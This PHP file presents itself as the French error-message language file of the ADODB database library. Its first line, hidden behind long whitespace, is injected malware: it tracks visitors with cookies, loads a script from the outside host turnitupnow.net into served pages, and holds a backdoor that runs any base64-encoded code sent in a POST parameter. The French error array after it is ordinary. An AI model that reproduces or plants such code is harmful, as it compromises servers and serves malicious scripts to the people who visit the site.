<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


$ADODB_LANG_ARRAY = array (
	'LANG'                      => 'fr',
	DB_ERROR                    => 'erreur inconnue',
	DB_ERROR_ALREADY_EXISTS     => 'existe d&eacute;j&agrave;',
	DB_ERROR_CANNOT_CREATE      => 'cr&eacute;tion impossible',
	DB_ERROR_CANNOT_DELETE      => 'effacement impossible',
	DB_ERROR_CANNOT_DROP        => 'suppression impossible',
	DB_ERROR_CONSTRAINT         => 'violation de contrainte',
	DB_ERROR_DIVZERO            => 'division par z&eacute;ro',
	DB_ERROR_INVALID            => 'invalide',
	DB_ERROR_INVALID_DATE       => 'date ou heure invalide',
	DB_ERROR_INVALID_NUMBER     => 'nombre invalide',
	DB_ERROR_MISMATCH           => 'erreur de concordance',
	DB_ERROR_NODBSELECTED       => 'pas de base de donn&eacute;ess&eacute;lectionn&eacute;e',
	DB_ERROR_NOSUCHFIELD        => 'nom de colonne invalide',
	DB_ERROR_NOSUCHTABLE        => 'table ou vue inexistante',
	DB_ERROR_NOT_CAPABLE        => 'fonction optionnelle non install&eacute;e',
	DB_ERROR_NOT_FOUND          => 'pas trouv&eacute;',
	DB_ERROR_NOT_LOCKED         => 'non verrouill&eacute;',
	DB_ERROR_SYNTAX             => 'erreur de syntaxe',
	DB_ERROR_UNSUPPORTED        => 'non support&eacute;',
	DB_ERROR_VALUE_COUNT_ON_ROW => 'valeur ins&eacute;r&eacute;e trop grande pour colonne',
	DB_ERROR_INVALID_DSN        => 'DSN invalide',
	DB_ERROR_CONNECT_FAILED     => '&eacute;chec &agrave; la connexion',
	0                        => "pas d'erreur", // DB_OK
	DB_ERROR_NEED_MORE_DATA     => 'donn&eacute;es fournies insuffisantes',
	DB_ERROR_EXTENSION_NOT_FOUND=> 'extension non trouv&eacute;e',
	DB_ERROR_NOSUCHDB           => 'base de donn&eacute;es inconnue',
	DB_ERROR_ACCESS_VIOLATION   => 'droits insuffisants'
);
?>